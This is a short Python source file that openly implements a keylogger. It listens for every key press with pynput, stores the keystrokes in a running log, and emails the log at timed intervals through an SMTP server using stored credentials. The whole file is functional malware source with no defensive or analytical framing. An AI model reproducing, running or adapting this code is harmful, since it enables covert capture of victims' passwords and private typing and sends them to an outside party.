#!/usr/bin/env python

import smtplib
import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, time_interval, email, password, smtp_server, port):
        self.log = "Keylogger started:\n\n"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.smtp = smtp_server
        self.port = port

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        finally:
            self.append_to_log(current_key)

    def report(self):
        if self.log != "":
            self.send_mail()
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self):
        server = smtplib.SMTP(self.smtp, self.port)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, "\n\n" + self.log)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
